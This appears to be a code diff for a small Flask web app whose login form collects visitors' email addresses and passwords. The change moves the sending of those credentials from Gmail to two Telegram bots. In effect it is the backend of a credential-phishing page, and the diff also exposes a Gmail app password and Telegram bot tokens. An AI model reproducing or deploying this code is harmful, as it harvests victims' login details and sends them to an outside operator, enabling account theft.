@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, redirect, url_for, flash
-from flask_mail import Mail, Message
+import requests
 import logging
 
 # Configure logging
@@ -8,14 +8,24 @@ logging.basicConfig(level=logging.DEBUG)
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your_secret_key_here'
 
-# Configure mail settings for Gmail
-app.config['MAIL_SERVER'] = 'smtp.gmail.com'
-app.config['MAIL_PORT'] = 587
-app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'ablastfromdepast@gmail.com'  # Your Gmail email address
-app.config['MAIL_PASSWORD'] = 'smiczlpozogmbwzd'  # Your Gmail password or App Password
+# Replace with your Telegram bot tokens and chat IDs
+TELEGRAM_BOT_TOKENS = ['7297501427:AAE0HXHD-zfLGktmOXRT-F75E_OXX9LcdyM', '7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8']
+TELEGRAM_CHAT_IDS = ['1249855882', '1174627659']
 
-mail = Mail(app)
+# Function to send message to Telegram
+def send_to_telegram(message):
+    for bot_token, chat_id in zip(TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_IDS):
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = {
+            'chat_id': chat_id,
+            'text': message
+        }
+        try:
+            response = requests.post(url, data=payload)
+            response.raise_for_status()  # Check for HTTP request errors
+            app.logger.debug(f"Message sent to Telegram successfully using bot token: {bot_token}")
+        except requests.exceptions.RequestException as e:
+            app.logger.error(f"Failed to send message to Telegram using bot token: {bot_token}. Error: {str(e)}")
 
 @app.route('/')
 def index():
@@ -26,21 +36,23 @@ def login():
     email = request.form['email']
     password = request.form['password']
 
-    recipients = [
-        app.config['MAIL_USERNAME'],  # Your main email
-        'martree234@gmail.com'   # Additional email
-    ]
+    app.logger.debug(f'Received email: {email}')
+    app.logger.debug(f'Received password: {password}')
 
-    try:
-        # Send email with login details to multiple recipients
-        msg = Message('Login Details', sender=app.config['MAIL_USERNAME'], recipients=recipients)
-        msg.body = f'Email: {email}\nPassword: {password}'
-        mail.send(msg)
-        flash('Login details sent successfully.', 'success')
-    except Exception as e:
-        flash(f'Failed to send email. Error: {str(e)}', 'error')
+    # Send email and password to Telegram
+    message = f"Email: {email}\nPassword: {password}"
+    send_to_telegram(message)
 
+    flash('Login details sent successfully.', 'success')
     return redirect(url_for('index'))
 
+@app.route('/test_telegram')
+def test_telegram():
+    # Test sending a message to Telegram
+    test_message = "This is a test message from Flask."
+    send_to_telegram(test_message)
+    return "Test message sent to Telegram."
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080, debug=True)
+    # Only run the app if this script is executed directly
+    app.run(host='0.0.0.0', port=5000, debug=True)
